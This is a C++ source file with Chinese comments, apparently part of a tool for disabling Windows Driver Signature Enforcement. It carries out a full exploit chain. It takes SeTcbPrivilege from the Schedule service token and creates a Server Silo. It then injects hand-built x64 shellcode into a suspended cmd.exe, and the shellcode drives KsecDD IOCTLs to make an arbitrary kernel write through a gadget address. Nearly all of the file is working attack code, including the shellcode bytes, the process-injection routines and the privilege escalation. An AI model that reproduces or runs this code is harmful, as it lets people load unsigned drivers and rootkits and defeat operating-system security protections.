    //   [0x0B0..0x0C0)  UNICODE_STRING deviceName
    //   [0x0C0..0x0F0)  OBJECT_ATTRIBUTES deviceOA（48 字节）
    //   [0x0F0..0x100)  FunctionReturn {function, argument}（16 字节）
    //   [0x100..0x110)  SetFunctionReturnReq {functionReturn*, value}（16 字节）
    //   [0x110..0x162)  L"\\SECURITY\\LSA_AUTHENTICATION_INITIALIZED\0"（82 字节）
    //   [0x162..0x180)  L"\\Device\\KsecDD\0"（30 字节）

    std::vector<unsigned char> buildSiloChildShellcode(
        const std::uint64_t gadgetAddress,
        const std::uint64_t targetAddress,
        const std::uint32_t value)
    {
        // ntdll 在所有进程中的加载基址相同，本进程取得的指针可直接用于子进程。
        const HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");
        auto addr = [ntdll](const char* name) -> std::uint64_t {
            return ntdll
                ? reinterpret_cast<std::uint64_t>(::GetProcAddress(ntdll, name))
                : 0;
        };
        const std::uint64_t fnNtOpenEvent           = addr("NtOpenEvent");
        const std::uint64_t fnNtSetEvent            = addr("NtSetEvent");
        const std::uint64_t fnNtClose               = addr("NtClose");
        const std::uint64_t fnNtOpenFile            = addr("NtOpenFile");
        const std::uint64_t fnNtSetInformationFile  = addr("NtSetInformationFile");
        const std::uint64_t fnNtDeviceIoControlFile = addr("NtDeviceIoControlFile");

        // x64 shellcode 主体（405 字节，对齐到 416）。
        // 入口：RCX = 分配块起始地址。rbx = RCX + kCodeSize = 数据段基址。
        // 运行时修复：两组 UNICODE_STRING.Buffer 和 OBJECT_ATTRIBUTES（ObjectName, Length, Attributes）。
        static const unsigned char code[] = {
            // === 序言（12 字节）===
            0x53,                                                       // [0]    push rbx
            0x48, 0x8D, 0x99, 0x00, 0x00, 0x00, 0x00,                  // [1-7]  lea rbx,[rcx+codeSize] (patch @4)
            0x48, 0x83, 0xEC, 0x50,                                     // [8-11] sub rsp, 0x50

            // === 指针修复（90 字节）===
            // eventName.Buffer = rbx + 0x110
            0x48, 0x8D, 0x83, 0x10, 0x01, 0x00, 0x00,                  // [12-18] lea rax,[rbx+0x110]
            0x48, 0x89, 0x43, 0x78,                                     // [19-22] mov [rbx+0x78],rax
            // eventOA.ObjectName = rbx + 0x70
            0x48, 0x8D, 0x43, 0x70,                                     // [23-26] lea rax,[rbx+0x70]
            0x48, 0x89, 0x83, 0x90, 0x00, 0x00, 0x00,                  // [27-33] mov [rbx+0x90],rax
            // eventOA.Length = 48
            0xC7, 0x83, 0x80, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00,// [34-43] mov dword [rbx+0x80],0x30
            // eventOA.Attributes = OBJ_CASE_INSENSITIVE (0x40)
            0xC7, 0x83, 0x98, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,// [44-53] mov dword [rbx+0x98],0x40
            // deviceName.Buffer = rbx + 0x162
            0x48, 0x8D, 0x83, 0x62, 0x01, 0x00, 0x00,                  // [54-60] lea rax,[rbx+0x162]
            0x48, 0x89, 0x83, 0xB8, 0x00, 0x00, 0x00,                  // [61-67] mov [rbx+0xB8],rax
            // deviceOA.ObjectName = rbx + 0xB0
            0x48, 0x8D, 0x83, 0xB0, 0x00, 0x00, 0x00,                  // [68-74] lea rax,[rbx+0xB0]
            0x48, 0x89, 0x83, 0xD0, 0x00, 0x00, 0x00,                  // [75-81] mov [rbx+0xD0],rax
            // deviceOA.Length = 48
            0xC7, 0x83, 0xC0, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00,// [82-91] mov dword [rbx+0xC0],0x30
            // deviceOA.Attributes = 0x40
            0xC7, 0x83, 0xD8, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,// [92-101] mov dword [rbx+0xD8],0x40

            // === 步骤 1：NtOpenEvent（29 字节）===
            0x48, 0x8D, 0x4B, 0x30,                                     // [102-105] lea rcx,[rbx+0x30]  &eventHandle
            0xBA, 0x02, 0x00, 0x00, 0x00,                               // [106-110] mov edx, 2  EVENT_MODIFY_STATE
            0x4C, 0x8D, 0x83, 0x80, 0x00, 0x00, 0x00,                  // [111-117] lea r8,[rbx+0x80]  &eventOA
            0xFF, 0x13,                                                  // [118-119] call [rbx]  NtOpenEvent
            0x89, 0x43, 0x40,                                            // [120-122] mov [rbx+0x40],eax
            0x85, 0xC0,                                                  // [123-124] test eax,eax
            0x0F, 0x85, 0x0A, 0x01, 0x00, 0x00,                        // [125-130] jnz done (rel=266)

            // === 步骤 2：NtSetEvent（12 字节）===
            0x48, 0x8B, 0x4B, 0x30,                                     // [131-134] mov rcx,[rbx+0x30]
            0x31, 0xD2,                                                  // [135-136] xor edx,edx
            0xFF, 0x53, 0x08,                                            // [137-139] call [rbx+0x08]  NtSetEvent
            0x89, 0x43, 0x44,                                            // [140-142] mov [rbx+0x44],eax

            // === 步骤 3：NtClose(eventHandle)（7 字节）===
            0x48, 0x8B, 0x4B, 0x30,                                     // [143-146] mov rcx,[rbx+0x30]
            0xFF, 0x53, 0x10,                                            // [147-149] call [rbx+0x10]  NtClose

            // === 步骤 4：NtOpenFile(\Device\KsecDD)（52 字节）===
            0x48, 0x8D, 0x4B, 0x38,                                     // [150-153] lea rcx,[rbx+0x38]  &deviceHandle
            0xBA, 0x00, 0x00, 0x00, 0xC0,                               // [154-158] mov edx,0xC0000000  GENERIC_R|W
            0x4C, 0x8D, 0x83, 0xC0, 0x00, 0x00, 0x00,                  // [159-165] lea r8,[rbx+0xC0]  &deviceOA
            0x4C, 0x8D, 0x4B, 0x60,                                     // [166-169] lea r9,[rbx+0x60]  &iosb
            0x48, 0xC7, 0x44, 0x24, 0x20, 0x03, 0x00, 0x00, 0x00,      // [170-178] mov qword [rsp+0x20],3 (FILE_SHARE_READ|WRITE)
            0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,      // [179-187] mov qword [rsp+0x28],0
            0xFF, 0x53, 0x18,                                            // [188-190] call [rbx+0x18]  NtOpenFile
            0x89, 0x43, 0x48,                                            // [191-193] mov [rbx+0x48],eax
            0x85, 0xC0,                                                  // [194-195] test eax,eax
            0x0F, 0x85, 0xC3, 0x00, 0x00, 0x00,                        // [196-201] jnz done (rel=195)

            // === 步骤 5：NtSetInformationFile(class 41, flags=0x6)（32 字节）===
            0x48, 0x8B, 0x4B, 0x38,                                     // [202-205] mov rcx,[rbx+0x38]  deviceHandle
            0x48, 0x8D, 0x53, 0x60,                                     // [206-209] lea rdx,[rbx+0x60]  &iosb
            0x4C, 0x8D, 0x43, 0x5C,                                     // [210-213] lea r8,[rbx+0x5C]  &flags
            0x41, 0xB9, 0x04, 0x00, 0x00, 0x00,                        // [214-219] mov r9d, 4  Length
            0xC7, 0x44, 0x24, 0x20, 0x29, 0x00, 0x00, 0x00,            // [220-227] mov dword [rsp+0x20],41
            0xFF, 0x53, 0x20,                                            // [228-230] call [rbx+0x20]  NtSetInformationFile
            0x89, 0x43, 0x4C,                                            // [231-233] mov [rbx+0x4C],eax

            // === 步骤 6：NtDeviceIoControlFile Connect 0x398000（77 字节）===
            0x48, 0x8B, 0x4B, 0x38,                                     // [234-237] mov rcx,[rbx+0x38]
            0x31, 0xD2,                                                  // [238-239] xor edx,edx
            0x45, 0x31, 0xC0,                                            // [240-242] xor r8d,r8d
            0x45, 0x31, 0xC9,                                            // [243-245] xor r9d,r9d
            0x48, 0x8D, 0x43, 0x60,                                     // [246-249] lea rax,[rbx+0x60]
            0x48, 0x89, 0x44, 0x24, 0x20,                               // [250-254] mov [rsp+0x20],rax  &iosb
            0xC7, 0x44, 0x24, 0x28, 0x00, 0x80, 0x39, 0x00,            // [255-262] mov dword [rsp+0x28],0x398000
            0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,      // [263-271] mov qword [rsp+0x30],0  InputBuf
            0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00,            // [272-279] mov dword [rsp+0x38],0  InputLen
            0x48, 0x8D, 0x43, 0x58,                                     // [280-283] lea rax,[rbx+0x58]
            0x48, 0x89, 0x44, 0x24, 0x40,                               // [284-288] mov [rsp+0x40],rax  &connectOut
            0xC7, 0x44, 0x24, 0x48, 0x04, 0x00, 0x00, 0x00,            // [289-296] mov dword [rsp+0x48],4
            0xFF, 0x53, 0x28,                                            // [297-299] call [rbx+0x28]  NtDeviceIoControlFile
            0x89, 0x43, 0x50,                                            // [300-302] mov [rbx+0x50],eax
            0x85, 0xC0,                                                  // [303-304] test eax,eax
            0x0F, 0x85, 0x56, 0x00, 0x00, 0x00,                        // [305-310] jnz done (rel=86)

            // === 步骤 7：修复 SetFunctionReturnReq.functionReturn（14 字节）===
            0x48, 0x8D, 0x83, 0xF0, 0x00, 0x00, 0x00,                  // [311-317] lea rax,[rbx+0xF0]
            0x48, 0x89, 0x83, 0x00, 0x01, 0x00, 0x00,                  // [318-324] mov [rbx+0x100],rax

            // === 步骤 8：NtDeviceIoControlFile Execute 0x39006F（72 字节）===
            0x48, 0x8B, 0x4B, 0x38,                                     // [325-328] mov rcx,[rbx+0x38]
            0x31, 0xD2,                                                  // [329-330] xor edx,edx
            0x45, 0x31, 0xC0,                                            // [331-333] xor r8d,r8d
            0x45, 0x31, 0xC9,                                            // [334-336] xor r9d,r9d
            0x48, 0x8D, 0x43, 0x60,                                     // [337-340] lea rax,[rbx+0x60]
            0x48, 0x89, 0x44, 0x24, 0x20,                               // [341-345] mov [rsp+0x20],rax
            0xC7, 0x44, 0x24, 0x28, 0x6F, 0x00, 0x39, 0x00,            // [346-353] mov dword [rsp+0x28],0x39006F
            0x48, 0x8D, 0x83, 0x00, 0x01, 0x00, 0x00,                  // [354-360] lea rax,[rbx+0x100]
            0x48, 0x89, 0x44, 0x24, 0x30,                               // [361-365] mov [rsp+0x30],rax  InputBuf
            0xC7, 0x44, 0x24, 0x38, 0x10, 0x00, 0x00, 0x00,            // [366-373] mov dword [rsp+0x38],16
            0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00,      // [374-382] mov qword [rsp+0x40],0
            0xC7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00, 0x00,            // [383-390] mov dword [rsp+0x48],0
            0xFF, 0x53, 0x28,                                            // [391-393] call [rbx+0x28]
            0x89, 0x43, 0x54,                                            // [394-396] mov [rbx+0x54],eax

            // === done（8 字节）===
            0x48, 0x83, 0xC4, 0x50,                                     // [397-400] add rsp, 0x50
            0x5B,                                                        // [401]     pop rbx
            0x31, 0xC0,                                                  // [402-403] xor eax,eax
            0xC3                                                         // [404]     ret
        };

        // 代码段 405 字节，按 16 字节对齐到 416。
        constexpr std::size_t kCodeSize = 416;
        constexpr std::size_t kDataSize = 0x180; // 384
        constexpr std::size_t kTotalSize = kCodeSize + kDataSize;

        // 数据段内偏移。
        constexpr std::size_t kOffFnNtOpenEvent           = 0x000;
        constexpr std::size_t kOffFnNtSetEvent            = 0x008;
        constexpr std::size_t kOffFnNtClose               = 0x010;
        constexpr std::size_t kOffFnNtOpenFile            = 0x018;
        constexpr std::size_t kOffFnNtSetInformationFile  = 0x020;
        constexpr std::size_t kOffFnNtDeviceIoControlFile = 0x028;
        constexpr std::size_t kOffEventHandle             = 0x030;
        constexpr std::size_t kOffDeviceHandle            = 0x038;
        constexpr std::size_t kOffEventOpenResult         = 0x040;
        constexpr std::size_t kOffEventSetResult          = 0x044;
        constexpr std::size_t kOffOpenDeviceResult        = 0x048;
        constexpr std::size_t kOffSetInfoResult           = 0x04C;
        constexpr std::size_t kOffConnectResult           = 0x050;
        constexpr std::size_t kOffExecuteResult           = 0x054;
        constexpr std::size_t kOffConnectOutputPid        = 0x058;
        constexpr std::size_t kOffSetInfoFlags            = 0x05C;
        constexpr std::size_t kOffIosb                    = 0x060;
        constexpr std::size_t kOffEventUstr               = 0x070;
        constexpr std::size_t kOffEventOa                 = 0x080;
        constexpr std::size_t kOffDeviceUstr              = 0x0B0;
        constexpr std::size_t kOffDeviceOa                = 0x0C0;
        constexpr std::size_t kOffFunctionReturn          = 0x0F0;
        constexpr std::size_t kOffSetFunctionReturnReq    = 0x100;
        constexpr std::size_t kOffEventString             = 0x110;
        constexpr std::size_t kOffDeviceString            = 0x162;

        std::vector<unsigned char> blob(kTotalSize, 0);

        // 写入代码段。
        std::memcpy(blob.data(), code, sizeof(code));

        // Patch: lea rbx, [rcx + kCodeSize] 的 imm32（偏移 4）。
        const std::uint32_t codeSizeU32 = static_cast<std::uint32_t>(kCodeSize);
        std::memcpy(blob.data() + 4, &codeSizeU32, 4);

        // jnz 偏移验证（已硬编码）：
        //   [125-130] → done(397) 从 131: 397-131 = 266 = 0x10A ✓
        //   [196-201] → done(397) 从 202: 397-202 = 195 = 0xC3  ✓
        //   [305-310] → done(397) 从 311: 397-311 = 86  = 0x56  ✓

        // 写入数据段。
        unsigned char* const data = blob.data() + kCodeSize;

        // 预填 6 个结果字段为 STATUS_UNSUCCESSFUL (0xC0000001)。
        // shellcode 短路跳过后续步骤时，未执行的结果保持哨兵，
        // 避免被调用者误判为 STATUS_SUCCESS (0)。
        constexpr std::uint32_t kSentinel = 0xC0000001UL;
        std::memcpy(data + kOffEventOpenResult,  &kSentinel, 4);
        std::memcpy(data + kOffEventSetResult,   &kSentinel, 4);
        std::memcpy(data + kOffOpenDeviceResult, &kSentinel, 4);
        std::memcpy(data + kOffSetInfoResult,    &kSentinel, 4);
        std::memcpy(data + kOffConnectResult,    &kSentinel, 4);
        std::memcpy(data + kOffExecuteResult,    &kSentinel, 4);

        // 函数指针。
        std::memcpy(data + kOffFnNtOpenEvent,           &fnNtOpenEvent, 8);
        std::memcpy(data + kOffFnNtSetEvent,            &fnNtSetEvent, 8);
        std::memcpy(data + kOffFnNtClose,               &fnNtClose, 8);
        std::memcpy(data + kOffFnNtOpenFile,            &fnNtOpenFile, 8);
        std::memcpy(data + kOffFnNtSetInformationFile,  &fnNtSetInformationFile, 8);
        std::memcpy(data + kOffFnNtDeviceIoControlFile, &fnNtDeviceIoControlFile, 8);

        // NtSetInformationFile 标志：SKIP_SET_EVENT_ON_HANDLE | SKIP_SET_USER_EVENT_ON_FAST_IO。
        const std::uint32_t setInfoFlagsVal =
            proto::kFileSkipSetEventOnHandle | proto::kFileSkipSetUserEventOnFastIo;
        std::memcpy(data + kOffSetInfoFlags, &setInfoFlagsVal, 4);

        // 事件 UNICODE_STRING：L"\\SECURITY\\LSA_AUTHENTICATION_INITIALIZED"。
        static const wchar_t eventNameStr[] = L"\\SECURITY\\LSA_AUTHENTICATION_INITIALIZED";
        constexpr unsigned short kEventNameLength    = sizeof(eventNameStr) - sizeof(wchar_t); // 80
        constexpr unsigned short kEventNameMaxLength = sizeof(eventNameStr);                    // 82
        std::memcpy(data + kOffEventUstr, &kEventNameLength, 2);
        std::memcpy(data + kOffEventUstr + 2, &kEventNameMaxLength, 2);
        std::memcpy(data + kOffEventString, eventNameStr, sizeof(eventNameStr));

        // 设备 UNICODE_STRING：L"\\Device\\KsecDD"。
        static const wchar_t deviceNameStr[] = L"\\Device\\KsecDD";
        constexpr unsigned short kDeviceNameLength    = sizeof(deviceNameStr) - sizeof(wchar_t); // 28
        constexpr unsigned short kDeviceNameMaxLength = sizeof(deviceNameStr);                    // 30
        std::memcpy(data + kOffDeviceUstr, &kDeviceNameLength, 2);
        std::memcpy(data + kOffDeviceUstr + 2, &kDeviceNameMaxLength, 2);
        std::memcpy(data + kOffDeviceString, deviceNameStr, sizeof(deviceNameStr));

        // FunctionReturn：{gadgetAddress, targetAddress}。
        std::memcpy(data + kOffFunctionReturn, &gadgetAddress, 8);
        std::memcpy(data + kOffFunctionReturn + 8, &targetAddress, 8);

        // SetFunctionReturnReq：{functionReturn 指针=运行时修复, value}。
        // functionReturn 指针留零，shellcode 在步骤 7 运行时写入。
        std::memcpy(data + kOffSetFunctionReturnReq + 8, &value, 4);

        return blob;
    }

    // ================================================================
    // 七、子进程创建与注入
    // ================================================================

    // ChildProcessGuard：
    // - 作用：RAII 封装子进程与主线程句柄，析构时终止并关闭。
    class ChildProcessGuard final
    {
    public:
        ChildProcessGuard() = default;

        ~ChildProcessGuard()
        {
            if (m_process != nullptr)
            {
                ::TerminateProcess(m_process, 0);
                ::CloseHandle(m_process);
            }
            if (m_thread != nullptr)
            {
                ::CloseHandle(m_thread);
            }
        }

        ChildProcessGuard(const ChildProcessGuard&) = delete;
        ChildProcessGuard& operator=(const ChildProcessGuard&) = delete;

        // create：
        // - 输入 siloJob：Silo 的 Job 句柄；trace：诊断输出；
        // - 作用：通过 PROC_THREAD_ATTRIBUTE_JOB_LIST 在 Silo 内创建挂起的子进程；
        // - 返回：true 表示子进程已创建并处于挂起状态。
        bool create(HANDLE siloJob, QStringList& trace)
        {
            // 使用 cmd.exe 作为宿主进程（不会实际执行命令，CREATE_SUSPENDED 阻止任何代码运行）。
            wchar_t systemDir[MAX_PATH] = {};
            if (::GetSystemDirectoryW(systemDir, MAX_PATH) == 0U)
            {
                trace.append(QStringLiteral("无法取得系统目录路径。"));
                return false;
            }
            const std::wstring cmdPath = std::wstring(systemDir) + L"\\cmd.exe";

            // 初始化扩展启动信息，包含 Job 列表属性。
            SIZE_T attrListSize = 0;
            ::InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);
            if (attrListSize == 0)
            {
                trace.append(QStringLiteral("InitializeProcThreadAttributeList 大小查询失败。"));
                return false;
            }

            std::vector<unsigned char> attrListBuffer(attrListSize, 0);
            auto* const attrList =
                reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attrListBuffer.data());
            if (::InitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize) == FALSE)
            {
                trace.append(QStringLiteral("InitializeProcThreadAttributeList 初始化失败。"));
                return false;
            }

            // PROC_THREAD_ATTRIBUTE_JOB_LIST 把子进程分配到 Silo Job。
            constexpr DWORD_PTR kProcThreadAttributeJobList = 0x0002000DUL;
            if (::UpdateProcThreadAttribute(
                    attrList,
                    0,
                    kProcThreadAttributeJobList,
                    &siloJob,
                    sizeof(HANDLE),
                    nullptr,
                    nullptr) == FALSE)
            {
                ::DeleteProcThreadAttributeList(attrList);
                trace.append(
                    QStringLiteral("UpdateProcThreadAttribute(JOB_LIST) 失败，Win32 错误 %1。")
                        .arg(::GetLastError()));
                return false;
            }

            // 创建挂起的子进程。
            STARTUPINFOEXW siEx{};
            siEx.StartupInfo.cb = sizeof(siEx);
            siEx.lpAttributeList = attrList;

            PROCESS_INFORMATION pi{};
            const BOOL created = ::CreateProcessW(
                cmdPath.c_str(),
                nullptr,
                nullptr,
                nullptr,
                FALSE,
                CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                nullptr,
                nullptr,
                &siEx.StartupInfo,
                &pi);

            ::DeleteProcThreadAttributeList(attrList);

            if (created == FALSE)
            {
                trace.append(
                    QStringLiteral("CreateProcessW 失败，Win32 错误 %1。")
                        .arg(::GetLastError()));
                return false;
            }

            m_process = pi.hProcess;
            m_thread = pi.hThread;
            trace.append(
                QStringLiteral("Silo 子进程已创建，PID = %1（挂起）。")
                    .arg(pi.dwProcessId));
            return true;
        }

        // process：子进程句柄。
        HANDLE process() const { return m_process; }

    private:
        HANDLE m_process = nullptr; // m_process：子进程句柄。
        HANDLE m_thread = nullptr;  // m_thread：子进程主线程句柄。
    };

    // injectAndExecute：
    // - 输入 childProcess：子进程句柄；shellcode：代码+数据字节序列；
    //        trace：诊断输出；
    //        eventOpenResult：NtOpenEvent 结果；eventSetResult：NtSetEvent 结果；
    //        openResult：NtOpenFile 结果；setInfoResult：NtSetInformationFile 结果；
    //        connectResult：ConnectLsa 结果；executeResult：SET_FUNCTION_RETURN 结果；
    // - 作用：将 shellcode 写入子进程、创建远程线程执行、读回全部 6 个 NTSTATUS 结果。
    bool injectAndExecute(
        HANDLE childProcess,
        const std::vector<unsigned char>& shellcode,
        QStringList& trace,
        long& eventOpenResult,
        long& eventSetResult,
        long& openResult,
        long& setInfoResult,
        long& connectResult,
        long& executeResult)
    {
        // 在子进程中分配可执行内存。
        void* const remoteBase = ::VirtualAllocEx(
            childProcess,
            nullptr,
            shellcode.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (remoteBase == nullptr)
        {
            trace.append(
                QStringLiteral("VirtualAllocEx 失败，Win32 错误 %1。")
                    .arg(::GetLastError()));
            return false;
        }
        trace.append(
            QStringLiteral("子进程中分配内存 = 0x%1，大小 = %2")
                .arg(reinterpret_cast<std::uint64_t>(remoteBase), 16, 16, QChar('0'))
                .arg(shellcode.size()));

        // 写入 shellcode + 数据块。
        SIZE_T written = 0;
        if (::WriteProcessMemory(
                childProcess, remoteBase,
                shellcode.data(), shellcode.size(),
                &written) == FALSE
            || written != shellcode.size())
        {
            ::VirtualFreeEx(childProcess, remoteBase, 0, MEM_RELEASE);
            trace.append(QStringLiteral("WriteProcessMemory 失败。"));
            return false;
        }

        // 创建远程线程执行 shellcode，线程参数 = remoteBase。
        DWORD threadId = 0;
        const HANDLE remoteThread = ::CreateRemoteThread(
            childProcess,
            nullptr,
            0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteBase),
            remoteBase,
            0,
            &threadId);
        if (remoteThread == nullptr)
        {
            ::VirtualFreeEx(childProcess, remoteBase, 0, MEM_RELEASE);
            trace.append(
                QStringLiteral("CreateRemoteThread 失败，Win32 错误 %1。")
                    .arg(::GetLastError()));
            return false;
        }
        trace.append(
            QStringLiteral("子进程远程线程已创建，ThreadId = %1。").arg(threadId));

        // 等待线程完成（超时 15 秒，Silo 路径步骤更多）。
        const DWORD waitResult = ::WaitForSingleObject(remoteThread, 15000);
        ::CloseHandle(remoteThread);

        if (waitResult != WAIT_OBJECT_0)
        {
            // 远程线程可能仍在执行 METHOD_NEITHER IOCTL，
            // 释放 remoteBase 会导致内核访问已释放的缓冲区。故意泄漏。
            trace.append(
                QStringLiteral("远程线程等待超时或失败，WaitResult = %1。远程内存未释放以避免 LSASS 崩溃。")
                    .arg(waitResult));
            return false;
        }

        // 读回 6 个 NTSTATUS 结果（与 buildSiloChildShellcode 数据布局一致）。
        constexpr std::size_t kCodeSize = 416;
        constexpr std::size_t kOffEventOpenResult  = 0x040;
        constexpr std::size_t kOffEventSetResult   = 0x044;
        constexpr std::size_t kOffOpenDeviceResult = 0x048;
        constexpr std::size_t kOffSetInfoResult    = 0x04C;
        constexpr std::size_t kOffConnectResult    = 0x050;
        constexpr std::size_t kOffExecuteResult    = 0x054;
        const auto* const dataBase =
            static_cast<const unsigned char*>(remoteBase) + kCodeSize;

        // 预填哨兵值：shellcode 短路或 RPM 失败时不会被误判为 STATUS_SUCCESS。
        constexpr std::uint32_t kSentinel = 0xC0000001UL;
        std::uint32_t results[6] = {
            kSentinel, kSentinel, kSentinel,
            kSentinel, kSentinel, kSentinel
        };
        SIZE_T readBytes = 0;

        // 逐个读回并检查 ReadProcessMemory 返回值。
        constexpr std::size_t kResultOffsets[] = {
            kOffEventOpenResult, kOffEventSetResult,
            kOffOpenDeviceResult, kOffSetInfoResult,
            kOffConnectResult, kOffExecuteResult
        };
        bool allReadsOk = true;
        for (int i = 0; i < 6; ++i)
        {
            if (::ReadProcessMemory(
                    childProcess, dataBase + kResultOffsets[i],
                    &results[i], sizeof(std::uint32_t),
                    &readBytes) == FALSE
                || readBytes != sizeof(std::uint32_t))
            {
                allReadsOk = false;
            }
        }

        ::VirtualFreeEx(childProcess, remoteBase, 0, MEM_RELEASE);

        if (!allReadsOk)
        {
            trace.append(
                QStringLiteral("远程线程已完成，但 ReadProcessMemory 失败（Win32 错误 %1）。IOCTL 可能已执行但无法确认结果。")
                    .arg(::GetLastError()));
            return false;
        }

        eventOpenResult = static_cast<long>(results[0]);
        eventSetResult  = static_cast<long>(results[1]);
        openResult      = static_cast<long>(results[2]);
        setInfoResult   = static_cast<long>(results[3]);
        connectResult   = static_cast<long>(results[4]);
        executeResult   = static_cast<long>(results[5]);

        trace.append(
            QStringLiteral("NtOpenEvent NTSTATUS = 0x%1")
                .arg(results[0], 8, 16, QChar('0')));
        trace.append(
            QStringLiteral("NtSetEvent NTSTATUS = 0x%1")
                .arg(results[1], 8, 16, QChar('0')));
        trace.append(
            QStringLiteral("NtOpenFile NTSTATUS = 0x%1")
                .arg(results[2], 8, 16, QChar('0')));
        trace.append(
            QStringLiteral("NtSetInformationFile NTSTATUS = 0x%1")
                .arg(results[3], 8, 16, QChar('0')));
        trace.append(
            QStringLiteral("ConnectLsa NTSTATUS = 0x%1")
                .arg(results[4], 8, 16, QChar('0')));
        trace.append(
            QStringLiteral("SET_FUNCTION_RETURN NTSTATUS = 0x%1")
                .arg(results[5], 8, 16, QChar('0')));
        return true;
    }
}

// ================================================================
// 八、executeViaSilo 公开接口
// ================================================================

namespace ks::misc::disable_dse
{
    ExecuteResult executeViaSilo(
        const std::uint64_t gadgetAddress,
        const std::uint64_t targetAddress,
        const std::uint32_t value)
    {
        ExecuteResult result;

        // 第一步：检查跨进程调用计数器。
        // static 保证映射句柄在进程生命期内不关闭，计数值在启动周期内持久有效。
        static SiloCallCounter counter;
        if (!counter.available())
        {
            result.failureText = QStringLiteral(
                "无法创建跨进程调用计数器（命名共享内存映射失败），fail-closed 拒绝执行。");
            return result;
        }
        const long currentCount = counter.currentCount();
        result.traceLines.append(
            QStringLiteral("当前启动周期 Silo 调用计数 = %1 / %2")
                .arg(currentCount)
                .arg(proto::kMaxSiloCallsPerBoot));

        if (!counter.tryAcquire())
        {
            result.failureText =
                QStringLiteral("已达本次启动周期的 Server Silo 路径调用上限（%1 次），"
                    "第 %2 次调用会触发内核 Bug Check，已拒绝执行。重启系统后计数器重置。")
                    .arg(proto::kMaxSiloCallsPerBoot)
                    .arg(proto::kMaxSiloCallsPerBoot + 1);
            return result;
        }
        result.traceLines.append(QStringLiteral("调用配额已获取。"));

        // 第二步：获取 SeTcbPrivilege（完整特权链）。
        HANDLE scheduleToken = nullptr;
        if (!acquireSeTcbPrivilege(result.traceLines, scheduleToken))
        {
            result.failureText = QStringLiteral("无法获取 SeTcbPrivilege。需要 Schedule 服务运行中且当前进程已提升权限。");
            return result;
        }

        // 第三步：创建 Server Silo（在 SeTcb 模拟状态下执行）。
        SiloGuard silo;
        const bool siloOk = silo.create(result.traceLines);

        // Silo 创建后立即撤销模拟并释放令牌。
        ::RevertToSelf();
        if (scheduleToken != nullptr)
        {
            ::CloseHandle(scheduleToken);
            scheduleToken = nullptr;
        }

        if (!siloOk)
        {
            result.failureText = QStringLiteral("Server Silo 创建失败。");
            return result;
        }

        // 第四步：在 Silo 中创建挂起的子进程。
        ChildProcessGuard child;
        if (!child.create(silo.job(), result.traceLines))
        {
            result.failureText = QStringLiteral("Silo 子进程创建失败。");
            return result;
        }

        // 第五步：构建并注入 shellcode。
        const auto shellcode = buildSiloChildShellcode(
            gadgetAddress, targetAddress, value);

        long eventOpenStatus = 0;
        long eventSetStatus  = 0;
        long openStatus      = 0;
        long setInfoStatus   = 0;
        long connectStatus   = 0;
        long executeStatus   = 0;

        if (!injectAndExecute(
                child.process(), shellcode, result.traceLines,
                eventOpenStatus, eventSetStatus,
                openStatus, setInfoStatus,
                connectStatus, executeStatus))
        {
            result.failureText = QStringLiteral("shellcode 注入或执行失败。");
            return result;
        }

        // 第六步：全链 NTSTATUS 判定。
        result.ioctlStatus = executeStatus;

        if (eventOpenStatus != 0)
        {
            result.failureText =
                QStringLiteral("NtOpenEvent(LSA_AUTHENTICATION_INITIALIZED) 失败，NTSTATUS=0x%1。LSA 初始化事件不存在或无权打开。")
                    .arg(static_cast<unsigned long>(eventOpenStatus), 8, 16, QChar('0'));
            return result;
        }
        if (eventSetStatus != 0)
        {
            result.failureText =
                QStringLiteral("NtSetEvent 失败，NTSTATUS=0x%1。LSA 初始化事件无法信号，后续 Connect 将失败。")
                    .arg(static_cast<unsigned long>(eventSetStatus), 8, 16, QChar('0'));
            return result;
        }
        if (openStatus != 0)
        {
            result.failureText =
                QStringLiteral("NtOpenFile(\\Device\\KsecDD) 失败，NTSTATUS=0x%1。Silo 命名空间可能需要更完整的配置。")
                    .arg(static_cast<unsigned long>(openStatus), 8, 16, QChar('0'));
            return result;
        }
        if (setInfoStatus != 0)
        {
            result.traceLines.append(
                QStringLiteral("NtSetInformationFile(FileIoCompletionNotification) 失败，NTSTATUS=0x%1（非致命，继续执行）。")
                    .arg(static_cast<unsigned long>(setInfoStatus), 8, 16, QChar('0')));
        }
        if (connectStatus != 0)
        {
            result.failureText =
                QStringLiteral("ConnectLsa IOCTL 失败，NTSTATUS=0x%1。")
                    .arg(static_cast<unsigned long>(connectStatus), 8, 16, QChar('0'));
            return result;
        }
        if (executeStatus != 0)
        {
            result.failureText =
                QStringLiteral("SET_FUNCTION_RETURN IOCTL 返回非零状态 0x%1，内核写可能未执行。")
                    .arg(static_cast<unsigned long>(executeStatus), 8, 16, QChar('0'));
            return result;
        }

        result.ok = true;
        return result;
    }
}
